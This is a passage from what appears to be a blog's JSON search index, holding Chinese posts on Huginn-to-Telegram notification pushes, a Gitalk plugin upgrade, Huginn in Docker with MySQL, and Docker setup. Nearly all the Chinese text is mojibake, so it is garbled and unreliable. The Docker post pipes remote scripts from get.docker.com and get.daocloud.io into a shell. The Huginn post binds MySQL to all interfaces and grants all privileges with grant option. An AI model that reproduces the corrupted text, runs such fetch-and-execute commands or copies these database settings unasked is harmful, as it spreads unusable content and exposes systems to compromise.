æ³¨å†Œä¸€ä¸ªTGBotï¼Œå¾—åˆ°tokenã€‚ è¿™é‡Œæ²¡æœ‰è®¾ç½®Webhookï¼Œåªéœ€è¦ç”¨åˆ°sendMessageæ–¹æ³•å°±å¥½äº†ã€‚ post_urlURLä¸ºhttps://api.telegram.org/bot&lt;token&gt;/sendMessageï¼Œå°†&lt;token&gt;éƒ¨åˆ†æ¢æˆè‡ªå·±çš„Bot tokenï¼Œå¯ä»¥ä¿å­˜åˆ°Credentialsé‡Œã€‚ å¦‚https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage å¯ä»¥å…ˆç”¨ PostMan æµ‹è¯•ä¸€ä¸‹ã€‚ åˆ«å¿˜äº†botâ€¦â€¦ï¼ˆæ˜¯æˆ‘äº† methodPOST or GET content_type URL query string application/x-www-form-urlencoded application/json (except for uploading files) multipart/form-data (use to upload files) payloadå‚æ•°åˆ—è¡¨å¦‚ä¸‹ ä¹Ÿå¯ä»¥ä½¿ç”¨Markdownè¯­æ³•ã€‚ï¼ˆè¿˜åˆ«è¯´ï¼ŒçœŸæŒºå¥½ å…¶å®è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘éƒ¨ç½²Huginnçš„æœåŠ¡å™¨æ˜¯åœ¨å¢™å†…çš„ï¼Œäºæ˜¯è¿˜éœ€è¦æƒ³åŠæ³•è½¬å‘å‡ºå»ã€‚ å…·ä½“è‡ªå·±æƒ³åŠæ³•äº†å•¦ã€‚ ï¼ˆæŠ˜è…¾äº†åŠå¤©ç”¨ heroku æ­äº†ä¸€ä¸ªè‡ªå·±å‡‘åˆç€ç”¨ å°ç»“å…¶å®æœ€åˆæ˜¯æƒ³çœ‹çœ‹Huginnæ€ä¹ˆç”¨çš„ï¼ŒæŠ˜è…¾è¿‡ç¨‹ä¸­è¿˜å»çœ‹äº†Liquidæ¨¡æ¿è¯­æ³•ï¼ŒXPath Functionsç”¨æ³•ã€‚ æ¨é€åˆ°å¾®ä¿¡çš„å‰å‡ å¤©å°±å¼„å¥½äº†ï¼Œæ˜¨å¤©æƒ³çœ‹çœ‹TG Botæ€ä¹ˆç©ï¼Œäºæ˜¯ç ”ç©¶äº†ä¸€ä¸‹Bot APIï¼Œé¡ºä¾¿åˆå†™äº†ä¸ªæ¨é€åˆ°TG Channelçš„ã€‚ æœ€ç»ˆçš„æ•ˆæœâ€”â€” æ¯éš”ä¸€æ®µæ—¶é—´ï¼ŒHuginn å°±ä¼šæ´¾å‡ºä¸€ä¸ªAgentå°å…µï¼Œå»çœ‹ä¸€çœ‹æ•™åŠ¡æœ‰æ²¡æœ‰æ–°çš„é€šçŸ¥å…¬å‘Šã€‚ å™¢æ¥äº†å‘€ï¼Agentå¸¦å›æ¥äº†ä¸€ä¸ªæ–°çš„Eventï¼Œå¿«æŠŠå®ƒæ¨ç»™ä¸»äººå§ï¼ Ding~ å¾®ä¿¡æ¥äº†ä¸€æ¡æ–°ä¿¡æ¯ã€‚ TGçš„Channelé‚£è¾¹ä¹Ÿæ¥äº†ã€‚ å—¯ï¼Œè¿™ä¸ªæ„Ÿè§‰å°±å¾ˆæ£’ï¼Œæœ´å®æ— åï¼Œä¸”æ¯ç‡¥ã€‚ï¼ˆç„¶è€Œå¹¶æ²¡æœ‰é’± emmm 24å·å¼€å§‹å°±è¦ç½‘ä¸Šä¸Šè¯¾äº†ã€‚ ä»¥ä¸Šå†…å®¹ä»…ä¾›å­¦ä¹ ç ”ç©¶ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚ å™¢å¯¹äº†ï¼ŒTG Channelçš„é‚€è¯·é“¾æ¥åœ¨è¿™ä¸ªåŸŸåé‡Œæ‰¾å˜»å˜»å˜»â€”â€” _tg_aaonotice.miaotony.xyz å°±åœ¨æˆ‘éƒ¨ç½²è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œå‘ç°æ‰€æœ‰çš„ éä»£ç å—å†…çš„ Liquidè¯­è¨€å…¨éƒ¨è¢«hexoè®¤ä¸ºæ˜¯ä»£ç äº†emmm æˆ‘å¿˜è®°hexoä¹Ÿç”¨äº†Liquidäº†ã€‚ã€‚ï¼ˆæ„Ÿè§‰è ¢æ­»äº† äºæ˜¯æŠŠéœ€è¦åœ¨æ‰€æœ‰çš„ {{xxx}}å’Œ{% xxx %}å¤–é¢å¥—ä¸€å±‚ {% raw %} ... {% endraw %}å¦‚æœè¦å†™ä¸Šé¢è¿™ä¸ªrawï¼Œéœ€è¦å†™ä¸¤ä¸ªï¼ˆç±»ä¼¼äºè½¬ä¹‰ï¼‰ã€‚ Reference Huginn Wiki Formatting Events using Liquid Liquid ä¸­æ–‡æ–‡æ¡£ Huginn Agent æ–‡æ¡£ Telegram Botå®˜æ–¹APIæ–‡æ¡£ RSS è¿›é˜¶ç¯‡ï¼šHuginn - çœŸÂ·ä¸ºä»»æ„ç½‘é¡µå®šåˆ¶ RSS æºï¼ˆPhantomJs æŠ“å–ï¼‰ Huginn å®ç°è‡ªåŠ¨é€šè¿‡ Telegram æ¨é€è±†ç“£é«˜åˆ†ç”µå½± XPath functionsï¼ˆä¸­æ–‡ä»‹ç»ï¼‰ etc.","path":"2020/02/11/Idea_Huginn_AAONoticeAutoPush/"},{"title":"BlogæŠ˜è…¾è®° | å‡çº§Gitalkè¯„è®ºæ’ä»¶ä»¥è§£å†³EmailBombs","text":"èµ·å› è¿™å‡ å¤©æˆ‘çš„é‚®ç®±è¢« GitHub è½°ç‚¸äº†emmmã€‚ å…·ä½“å¤§æ¦‚æ˜¯è¿™æ ·çš„â€”â€” è¯´å¥½çš„ Depending on your API usage, weâ€™ll be sending you this email reminder at most once every 3 days. ç„¶è€Œä»2æœˆ4æ—¥å¼€å§‹æ¯å¤©éƒ½æœ‰ä¸€å †â€¦â€¦ æ‰€ä»¥è¿™åˆ°åº•æ˜¯ä»€ä¹ˆå›äº‹å‘¢ï¼Ÿ æˆ‘ä¸€æƒ³ï¼Œç”¨åˆ°è¿™ä¸ª API çš„åªæœ‰æˆ‘åšå®¢çš„ Gitalk è¯„è®ºæ’ä»¶ã€‚ç›®å‰æˆ‘åšå®¢çš„è¯„è®ºéƒ½æ”¾åœ¨äº†GitHubé¡¹ç›®çš„issueé‡Œï¼Œæ¯ç¯‡æ–‡ç« æµè§ˆåˆ°ä¸‹é¢çš„æ—¶å€™ä¼šè‡ªåŠ¨åŠ è½½è¯„è®ºï¼Œè¿™æ—¶å€™å°±ä¼šå‘GitHubçš„APIå‘è¯·æ±‚ä»è€Œè·å–ç›¸åº”æ•°æ®ã€‚ è§£å†³æ–¹æ¡ˆäºæ˜¯å» gitalk çš„å®˜æ–¹ä»“åº“çœ‹äº†çœ‹ï¼Œæœç„¶2æœˆ4æ—¥å½“å¤©å°±æœ‰äººæissueäº†ï¼Œçœ‹æ¥ä¸å°‘äºº Email Bombs äº†23333ï¼ˆæ‘Šæ‰‹ã€‚ https://github.com/gitalk/gitalk/issues/343 å¾ˆå¤šå¤§ä½¬å¯¹è¿™ä¸ªé—®é¢˜è¿›è¡Œäº†è®¨è®ºï¼Œå½“ç„¶ä¹Ÿæœ‰ä¸å°‘ +1 Markä¹‹ç±»çš„åœ¨æ—è§‚ã€‚ æ–¹æ¡ˆä¸€2æœˆ4æ—¥è¿™æ ·ï¼Œ@geektutu ç»™å‡ºäº†ä¸€ä¸ª Use read-only personal access token to replace clientID &amp; clientSecret çš„æ–¹æ¡ˆï¼Œå¹¶æäº†PRï¼Œè¯¦è§ï¼š#344ã€‚è¿™ä¸ªPRåœ¨2æœˆ6æ—¥mergeäº†ã€‚ æ ¹æ®ä»–çš„å»ºè®®ï¼Œé¦–å…ˆéœ€è¦æ›´æ–° gitalk.min.jsæ–‡ä»¶ï¼Œå¦‚æœæƒ³è·å¾—æ›´å¤šçš„APIä½¿ç”¨é‡ï¼Œéœ€è¦åœ¨ accessToken é‡Œç”Ÿæˆä¸€ä¸ªåªè¯»çš„tokenï¼Œè€Œåä¿®æ”¹ Gitalk æ¨¡æ¿é‡Œçš„é…ç½®ï¼Œæ–°å¢accessTokené¡¹ã€‚ const gitalk = new Gitalk({ clientID: 'GitHub Application Client ID', clientSecret: 'GitHub Application Client Secret', accessToken: 'Github Personal Access Token', // IMPORTANT !!! repo: 'GitHub repo', owner: 'GitHub repo owner', ... }) æ ¹æ® Understanding scopes for OAuth Apps ï¼Œåœ¨æ–°å»º access token æ—¶ä¸é€‰æ‹©ä»»ä½•é€‰é¡¹ï¼Œåˆ™ç”Ÿæˆçš„tokenåªæœ‰å…¬å¼€ä¿¡æ¯çš„åªè¯»æƒé™ï¼ˆ*Grants read-only access to public information (includes public user profile info, public repository info, and gists)*ï¼‰ã€‚ 6å·æˆ‘ä¹Ÿæ›´æ–°äº†è¿™ä¸€ç‰ˆæœ¬ï¼Œåšäº†ç›¸åº”çš„ä¿®æ”¹ï¼Œçš„ç¡®é‚®ç®±ä¸è¢«è½°ç‚¸äº†ã€‚ğŸ˜‚ ä½†æ˜¯ï¼Œè¿™ä¸ª access token åœ¨ä»»ä½•äººè®¿é—®åšå®¢çš„æ—¶å€™éƒ½æ˜¯å…¬å¼€å¯è§çš„ï¼Œä¸å…å­˜åœ¨é£é™©ï¼Œè¿™ä¹Ÿåœ¨issueé‡Œæœ‰è¿‡è®¨è®ºã€‚@geektutu ä¹Ÿè¯´è¿™æ˜¯ä¸ªä¸´æ—¶æ–¹æ¡ˆã€‚ æ–¹æ¡ˆäºŒ2æœˆ7æ—¥ï¼Œè¿™ä¸ªissueçš„å‘èµ·è€… @fletchto99 ç»™å‡ºäº†ä»–çš„æ–¹æ¡ˆï¼Œå¹¶æäº†PRï¼Œè¯¦è§ï¼šgitalk/gitalk#346 åˆ©ç”¨åŸæ¥çš„client_id å’Œ client_secret ä½œä¸º basic auth æ˜¯å¯è¡Œçš„ã€‚ æŒ‰ç…§ä»–çš„æ–¹æ¡ˆï¼Œä¸éœ€è¦ä¿®æ”¹å…¶ä»–çš„ä»»ä½•é…ç½®ï¼Œç›´æ¥æŠŠGitalkçš„jså‡çº§åˆ°V1.5.2 å³å¯ã€‚ è¿™æ ·å°±æ–¹ä¾¿äº†å¾ˆå¤šå“ˆï¼Œè¯•äº†ä¸€ä¸‹æœç„¶æ˜¯å¯è¡Œçš„ã€‚ è€Œä¸”è¿™ä¸ªå¯ä»¥è¯´æ˜¯æœ€ä½³æ–¹æ¡ˆäº†å‘¢ï¼ é’ˆå¯¹ Matery ä¸»é¢˜çš„ä¿®æ”¹æ–¹æ³•ä¸€å¯¹äºæˆ‘ç°åœ¨ä½¿ç”¨çš„ Matery ä¸»é¢˜ï¼ˆhexo-theme-materyï¼‰ï¼Œåªéœ€è¦å°† \\hexo\\themes\\matery\\source\\libs\\gitalkç›®å½•ä¸‹çš„ gitalk.min.jså’Œ gitalk.css æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼ˆ&gt;= V1.5.2ï¼‰å³å¯ã€‚ æ–¹æ³•äºŒå½“ç„¶ä¹Ÿå¯ä»¥ä¿®æ”¹é…ç½®æ–‡ä»¶é‡Œå¼•ç”¨çš„ JavaScriptï¼ˆã€CSSï¼‰åœ°å€ä¸ºé“¾æ¥ç‰ˆæœ¬ã€‚ ç›®å‰ CDN ä¸Šçš„ Gitalk å·²ç»æ›´æ–°åˆ°äº†æœ€æ–°ç‰ˆæœ¬ã€‚ æ‰“å¼€\\hexo\\themes\\matery\\_config.ymlï¼Œä¿®æ”¹å…¶ä¸­çš„ libsã€‚ libs: css: # ... gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css # æˆ–è€… https://unpkg.com/gitalk/dist/gitalk.css # ... js: # ... gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js # æˆ–è€… https://unpkg.com/gitalk/dist/gitalk.min.js # ... ä¿å­˜åï¼Œåœ¨ hexo çš„ç›®å½•ä¸‹æ‰§è¡Œ hexo clean &amp;&amp; hexo gï¼Œå†éƒ¨ç½²å³å¯ã€‚ æœ€åï¼Œé¡ºæ‰‹ç»™ hexo-theme-matery æäº†ä¸ªPRï¼Œæ›´æ–°äº†è¿™ä¸€ä¾èµ–ï¼Œè¯¦è§ blinkfox/hexo-theme-matery#318 ã€‚","path":"2020/02/07/Blog_UpdateGitalk/"},{"title":"åŸºäºDockeræ­å»ºHuginn","text":"What is Huginn? Huginn is a system for building agents that perform automated tasks for you online. They can read the web, watch for events, and take actions on your behalf. Huginnâ€™s Agents create and consume events, propagating them along a directed graph. Think of it as a hackable version of IFTTT or Zapier on your own server. You always know who has your data. You do. Huginnæ˜¯ä¸€ä¸ªç¥å™¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªç§äººIFTTTï¼Œä¾‹å¦‚æ­å»ºä»»åŠ¡é‡‡é›†è§¦å‘å¹³å°ï¼Œè‡ªåŠ¨è·Ÿè¿›å®æ—¶æé†’ï¼ˆç”¨Email Slack Telegeram QQ å¾®ä¿¡æ¥æ”¶æ¨é€ï¼‰ï¼Œå…¨æ–‡ RSS è¾“å‡ºï¼ˆæŠŠä½ å…³æ³¨çš„æ‰€æœ‰ç½‘é¡µè¿›è¡Œ RSS å…¨æ–‡è¾“å‡ºï¼‰ï¼ŒåŒæ—¶å¯ä»¥æŠŠå„ç§appï¼Œè½¯ä»¶ï¼Œç½‘ç»œæœåŠ¡ï¼Œç½‘ç»œè®¾å¤‡ç­‰é“¾æ¥åœ¨ä¸€èµ·åšä»»åŠ¡è§¦å‘ã€‚ å®˜æ–¹Githubä»“åº“ï¼šhttps://github.com/huginn/huginn è¿™ä¸ªæ˜¯æˆ‘åœ¨ç©çˆ¬è™«çš„æ—¶å€™ï¼Œå¶ç„¶é—´åœ¨ç½‘ä¸Šçœ‹åˆ°çš„ä¸€ä¸ªå·¥å…·ï¼Œèƒ½åšçš„äº‹æƒ…è¿˜ä¸å°‘ï¼Œè§‰å¾—è¿˜æŒºä¸é”™çš„ï¼Œè¿™æ¬¡å°±è¯•ç€æ­å»ºä¸€ä¸‹å§ã€‚ Installationæ‰‹åŠ¨å®‰è£…çš„è¯ï¼Œéœ€è¦ä¸‹é¢è¿™æ ·ä¸€æ­¥æ­¥æ¥ï¼Œæ„Ÿè§‰å¥½éº»çƒ¦â€¦â€¦ï¼ˆæ‡’ The Huginn installation consists of setting up the following components: Packages / Dependencies Ruby System Users Database Huginn Nginx ä½†æ˜¯ï¼ŒHuginnè¿˜æä¾›äº†ä¸€ç§é€šè¿‡dockeræ¥æ­å»ºçš„æ–¹å¼ï¼Œå¯ä»¥å…å»é…ç¯å¢ƒçš„çƒ¦æ¼ï¼Œæ„Ÿè§‰è´¼å¥½~ å®˜æ–¹çš„æ–‡æ¡£åœ¨è¿™é‡Œã€‚ 1. å®‰è£… Dockerå¯ä»¥å‚è€ƒè¿™é‡Œã€‚ 2. å®‰è£… Huginnæœ€ç®€å•çš„å°±ç›´æ¥ docker run -it -p 3000:3000 huginn/huginn é¦–å…ˆä¼šæŠŠhuginnç»™pullä¸‹æ¥ï¼Œç„¶åè¿è¡Œã€‚ ç„¶åè®¿é—® http://localhost:3000 å¯ä»¥çœ‹åˆ° 3. ç™»å½•åˆ©ç”¨username admin and password passwordç™»å½•ï¼Œä¹‹åå¯ä»¥åœ¨Accounté‡Œè¿›è¡Œä¿®æ”¹ã€‚ 4. é…ç½®å¼€æœºè‡ªå¯docker update --restart=always huginn å¥½äº†ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥å°½æƒ…æ„Ÿå—huginnçš„é­…åŠ›äº†ï¼ Connect to local MySQLä¸Šé¢çš„å®‰è£…æ–¹æ³•æ˜¯æœ€ç®€å•çš„ï¼Œé»˜è®¤ä¼šåœ¨Dockerå®¹å™¨é‡Œå®‰è£…MySQLæ•°æ®åº“ç­‰ç¯å¢ƒã€‚ ä½†æ˜¯å¦‚æœæœ¬æœºå°±è£…äº†ä¸€ä¸ªMySQLæ•°æ®åº“ï¼Œéœ€è¦ huginn å…±äº«çš„è¯ï¼Œ æˆ–è€…è¯´æƒ³è¦huginnè¿æ¥åˆ°æœ¬åœ°æ•°æ®åº“ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·å®‰è£…ã€‚ 1. å®‰è£… DockeråŒä¸Šã€‚ 2. é…ç½® MySQL2.1 ä¿®æ”¹ç»‘å®šçš„IPä¸º 0.0.0.0è¿™æ˜¯ä¸ºäº†è®©dockerèƒ½è¿æ¥åˆ°æœ¬åœ°çš„æ•°æ®åº“ã€‚ é»˜è®¤çš„ 127.0.0.1 åªèƒ½ä»æœ¬åœ°è®¿é—®ã€‚ MySQLï¼š vim /etc/mysql/mysql.conf.d/mysqld.cnf ä¿®æ”¹ bind-address = 0.0.0.0 ç„¶å é‡å¯ sudo systemctl restart mysql MariaDBï¼š /etc/mysql/mariadb.cnfåŒ…å«äº†ä¸‹é¢çš„æ‰€ä»¥.cnfæ–‡ä»¶ !includedir /etc/mysql/conf.d/ !includedir /etc/mysql/mariadb.conf.d/ æˆ‘è¿™é‡Œçš„åœ¨ä¸‹é¢è¿™ä¸ªæ–‡ä»¶é‡Œ vim /etc/mysql/mariadb.conf.d/50-server.cnf åŒæ ·ä¿®æ”¹ bind-address = 0.0.0.0 è€Œå é‡å¯ sudo systemctl restart mysql 2.2 MySQLé‡Œæ–°å»º huginn ç”¨æˆ·å½“ç„¶ä¹Ÿå¯ä»¥è®©huginnç›´æ¥ä»¥rootç”¨æˆ·æ¥è®¿é—®æ•°æ®åº“ï¼Œé‚£å°±ç›´æ¥è·³åˆ°2.3èŠ‚ã€‚ ä¸è¿‡å®‰å…¨èµ·è§ï¼Œè¿˜æ˜¯æ–°å»ºä¸€ä¸ªç”¨æˆ·å§ã€‚ ä»¥rootç™»å½•MySQL / MariaDB mysql -u root -p æ–°å»ºhuginnç”¨æˆ·ï¼Œå¯†ç ä¸ºPASSWORD create user 'huginn'@'%' identified by 'PASSWORD'; è¿™ä¸ªæ˜¯å…è®¸ä»ä»»æ„åœ°æ–¹ç™»å½•ã€‚ å¦‚æœè¦é™åˆ¶ä»dockeré‡Œå¯åŠ¨ï¼Œå…ˆifconfigçœ‹ä¸‹ docker0 çš„IPï¼Œä¸€èˆ¬æ˜¯172.17.0.1ï¼Œåˆ™ docker IP ä¸º172.17.0.*ï¼Œäºæ˜¯ create user 'huginn'@'172.17.0.%' identified by 'PASSWORD'; 2.3 èµ‹äºˆæƒé™GRANT ALL PRIVILEGES ON *.* TO 'huginn'@'172.17.0.%' IDENTIFIED BY 'PASSWORD' WITH GRANT OPTION; flush privileges; å¦‚æœé™åˆ¶è®¿é—®çš„æ•°æ®åº“åˆ™ä¿®æ”¹*.*ä¸ºç›¸åº”çš„æ•°æ®åº“å³å¯ã€‚ 3. é…ç½® firewallå¦‚æœå¯ç”¨äº† firewall çš„è¯ï¼Œéœ€è¦æ”¾è¡Œæœ¬åœ°çš„3306ç«¯å£ï¼ˆå³æ•°æ®åº“çš„ç›¸åº”ç«¯å£ï¼‰ã€‚ Ubuntuï¼š sudo ufw allow 3306 CentOSï¼š sudo firewall-cmd --zone=public --add-port=3306/tcp --permanent # å¼€æ”¾ç«¯å£ sudo systemctl restart firewalld.service # é‡å¯firewall 4. å®‰è£… Huginné¦–æ¬¡å®‰è£…ï¼š docker run --name huginn \\ -p 3000:3000 \\ --restart always \\ -e MYSQL_PORT_3306_TCP_ADDR=172.17.0.1 \\ -e HUGINN_DATABASE_NAME=huginn \\ -e HUGINN_DATABASE_USERNAME=huginn \\ -e HUGINN_DATABASE_PASSWORD=PASSWORD \\ huginn/huginn è¿™é‡Œå»ºäº†ä¸€ä¸ªåä¸ºhuginnçš„æ•°æ®åº“ã€‚ 172.17.0.1æ˜¯æœ¬åœ°çš„IPï¼Œå³åœ¨ifconfigçœ‹åˆ°çš„ docker0 çš„IPã€‚ç¡®ä¿åœ¨æœ¬åœ°å¯ä»¥é€šè¿‡è¿™ä¸ªIPè¿ä¸Šæ•°æ®åº“ã€‚ ä¹‹åç›´æ¥è¿™æ ·å³å¯â†“ã€‚ docker start huginn ä¸Šé¢é¦–æ¬¡å®‰è£…æ—¶å·²ç»é…ç½®äº†å¼€æœºè‡ªå¯ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥è¿™æ ·é…ç½®â€”â€” docker update --restart=always huginn å¥½äº†ï¼Œå®Œå·¥ï¼ Referencehttps://github.com/huginn/huginn https://www.jianshu.com/p/d272a09ba686","path":"2020/02/03/Server_Huginn/"},{"title":"Dockerå®‰è£…åŠå¸¸ç”¨å‘½ä»¤","text":"ç®€ä»‹ Building and deploying new applications is faster with containers.Docker containers wrap up software and its dependencies into a standardized unit for software development that includes everything it needs to run: code, runtime, system tools and libraries. This guarantees that your application will always run the same and makes collaboration as simple as sharing a container image. Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäº Go è¯­è¨€ å¹¶éµä» Apache2.0 åè®®å¼€æºã€‚ Docker å¯ä»¥è®©å¼€å‘è€…æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªè½»é‡çº§ã€å¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linux æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚ å®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼Œç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æ¥å£ï¼ˆç±»ä¼¼ iPhone çš„ appï¼‰,æ›´é‡è¦çš„æ˜¯å®¹å™¨æ€§èƒ½å¼€é”€æä½ã€‚ å…¶å®æ„Ÿè§‰ä¸Šå°±æ˜¯emmm åˆ«äººæŠŠæ•´å¥—ç¯å¢ƒéƒ½é…ç½®å¥½æ‰“åŒ…å¥½äº†ï¼Œä½ ç›´æ¥æ‹¿è¿‡æ¥ç”¨å°±å¥½äº†ï¼ åæ­£ç”¨èµ·æ¥è´¼æ–¹ä¾¿å°±æ˜¯äº†ã€‚ æ„Ÿè§‰dockerçš„å›¾æ ‡å°±æŒºå¥½çœ‹çš„ï¼ˆ å®‰è£…curl -fsSL get.docker.com -o get-docker.sh sudo sh get-docker.sh --mirror Aliyun Windowsä¸‹ä¸‹è½½Docker Desktop https://www.docker.com/products/docker-desktop ï¼ˆè¦ç™»é™†ï¼‰ æ¢æºLinuxä¸‹ï¼Œç¼–è¾‘æ­¤æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰åˆ™æ–°å»ºã€‚ sudo vim /etc/docker/daemon.json Windowsä¸‹æ–‡ä»¶ä¸ºï¼š %programdata%\\docker\\config\\daemon.json USTC ä¸­ç§‘å¤§æºï¼ˆæ¨èï¼ï¼‰https://lug.ustc.edu.cn/wiki/mirrors/help/docker { \"registry-mirrors\": [\"https://docker.mirrors.ustc.edu.cn\"] } Azure ä¸­å›½é•œåƒhttps://github.com/Azure/container-service-for-azure-china/blob/master/aks/README.md#22-container-registry-proxy { \"registry-mirrors\": [\"https://dockerhub.azk8s.cn\"] } DaoCloud æºhttps://www.daocloud.io/mirror { \"registry-mirrors\": [\"http://f1361db2.m.daocloud.io\"] } æˆ–è€… ç›´æ¥æ‰§è¡Œè¿™ä¸ªå°±å¯ä»¥ä¸€é”®ä¿®æ”¹ curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io 163ç½‘æ˜“æº{ \"registry-mirrors\": [ \"http://hub-mirror.c.163.com\" ] } é˜¿é‡Œæºè¦æ³¨å†Œï¼Œç•¥ã€‚ é…ç½®å¤šä¸ªé•œåƒ{ \"registry-mirrors\": [ \"https://docker.mirrors.ustc.edu.cn\", \"https://dockerhub.azk8s.cn/\", \"http://hub-mirror.c.163.com\" ] } æ³¨æ„éµå¾ªjsonæ ¼å¼ã€‚ é…ç½®å®Œä¹‹åé‡å¯æœåŠ¡sudo systemctl daemon-reload sudo systemctl restart docker æ£€æŸ¥åŠ é€Ÿå™¨æ˜¯å¦ç”Ÿæ•ˆdocker info æœ‰å¦‚ä¸‹ä¿¡æ¯åˆ™é…ç½®æˆåŠŸã€‚ Portainer Portainer æ˜¯ Docker çš„å›¾å½¢åŒ–ç®¡ç†å·¥å…·ï¼Œæä¾›çŠ¶æ€æ˜¾ç¤ºé¢æ¿ã€åº”ç”¨æ¨¡æ¿å¿«é€Ÿéƒ¨ç½²ã€å®¹å™¨é•œåƒç½‘ç»œæ•°æ®å·çš„åŸºæœ¬æ“ä½œï¼ˆåŒ…æ‹¬ä¸Šä¼ ä¸‹è½½é•œåƒï¼Œåˆ›å»ºå®¹å™¨ç­‰æ“ä½œï¼‰ã€äº‹ä»¶æ—¥å¿—æ˜¾ç¤ºã€å®¹å™¨æ§åˆ¶å°æ“ä½œã€Swarmé›†ç¾¤å’ŒæœåŠ¡ç­‰é›†ä¸­ç®¡ç†å’Œæ“ä½œã€ç™»å½•ç”¨æˆ·ç®¡ç†å’Œæ§åˆ¶ç­‰åŠŸèƒ½ã€‚åŠŸèƒ½ååˆ†å…¨é¢ï¼ŒåŸºæœ¬èƒ½æ»¡è¶³ä¸­å°å‹å•ä½å¯¹å®¹å™¨ç®¡ç†çš„å…¨éƒ¨éœ€æ±‚ã€‚ éƒ¨ç½²# æ‹‰å–é•œåƒ docker pull portainer/portainer # ä¸€é”®éƒ¨ç½² docker volume create portainer_data docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer è®¿é—® http://127.0.0.1:9000 å³å¯è®¿é—®å›¾å½¢åŒ–é¢æ¿ã€‚é…ç½®å¥½ç”¨æˆ·åã€å¯†ç åç™»å½•ã€‚ è¿æ¥åˆ°Localï¼Œç™»å½•åçš„ä¸»ç•Œé¢å¦‚ä¸‹ã€‚ é€šè¿‡è¿œç¨‹è®¿é—®éœ€è¦åœ¨é˜²ç«å¢™æ”¾è¡Œ9000ç«¯å£ã€‚ Ubuntu: sudo ufw allow 9000 CentOS:ï¼ˆå…¶å®ä¹Ÿå¯ä»¥è£…ä¸ª ufw çš„ï¼‰ sudo firewall-cmd --zone=public --add-port=9000/tcp --permanent # å¼€æ”¾ç«¯å£ sudo systemctl restart firewalld.service # é‡å¯firewall å¼€æœºè‡ªå¯docker update --restart=always portainer å…¶å®åœ¨ä¸Šé¢çš„ä¸€é”®éƒ¨ç½²å‘½ä»¤ä¸­å·²ç»åŠ äº†ï¼Œè¿™é‡Œä¸éœ€è¦äº†ã€‚ï¼ˆè®°å½•ä¸€ä¸‹è€Œå·²ï¼‰ å¸¸ç”¨å‘½ä»¤ç³»ç»Ÿç›¸å…³æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯docker info æŸ¥çœ‹é•œåƒã€å®¹å™¨ã€æ•°æ®å·æ‰€å ç”¨çš„ç©ºé—´docker system df å®¹å™¨ç›¸å…³æŸ¥çœ‹å½“å‰å®¹å™¨docker ps -a æœ‰-aåˆ™æ˜¾ç¤ºæ‰€æœ‰çš„å®¹å™¨ï¼ŒåŒ…æ‹¬å¯åŠ¨çš„å’Œæœªå¯åŠ¨çš„ã€‚æ²¡æœ‰-açš„è¯åˆ™åªæ˜¾ç¤ºè¿è¡Œç€çš„ã€‚ åˆ›å»º&amp;ä½¿ç”¨å®¹å™¨docker run -it --name å®¹å™¨å é•œåƒå/é•œåƒID /bin/bash ä½¿ç”¨ -d å‚æ•°è¿è¡Œå®¹å™¨ï¼Œå¯ä»¥è®©å®¹å™¨åœ¨åå°è¿è¡Œè€Œä¸æŠŠSTDOUTè¾“å‡ºåˆ°å®¿ä¸»æœºä¸Šã€‚ ï¼ˆç”¨docker logs [container ID or NAMES]æŸ¥çœ‹ï¼‰ å½“ -i -t å‚æ•°ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå¯ä»¥çœ‹åˆ° Linux å‘½ä»¤æç¤ºç¬¦ï¼Œå¦‚root@69d137adef7a:/#ã€‚åªæœ‰ -iåˆ™æ²¡æœ‰å‘½ä»¤æç¤ºç¬¦ã€‚ å¯åŠ¨å®¹å™¨docker start å®¹å™¨å/å®¹å™¨ID é‡å¯å®¹å™¨docker restart å®¹å™¨å/å®¹å™¨ID ç»ˆæ­¢å®¹å™¨docker stop å®¹å™¨å/å®¹å™¨ID æŸ¥çœ‹å®¹å™¨ä¿¡æ¯docker container ls -a å®¹å™¨ç»Ÿè®¡ä¿¡æ¯docker stats å¯åŠ¨å·²ç»ˆæ­¢å®¹å™¨docker container start è·å–å®¹å™¨çš„è¾“å‡ºä¿¡æ¯docker container logs [container ID or NAMES] è¿›å…¥å®¹å™¨ï¼ˆè¿æ¥å®¹å™¨ï¼‰docker exec -it å®¹å™¨å/å®¹å™¨ID /bin/bash ä»è¿™ä¸ª stdin ä¸­ exitï¼Œä¸ä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ã€‚ï¼ˆæ¨èâ†‘ï¼‰ è€Œä¸‹é¢è¿™ä¸ªï¼Œä»è¿™ä¸ª stdin ä¸­ exitï¼Œä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ã€‚ docker attach å®¹å™¨å/å®¹å™¨ID åˆ é™¤å®¹å™¨docker rm å®¹å™¨å/å®¹å™¨ID é•œåƒç›¸å…³æœç´¢é•œåƒdocker search å…³é”®è¯ ä¸‹è½½é•œåƒdocker pull é•œåƒå é•œåƒå:Tag 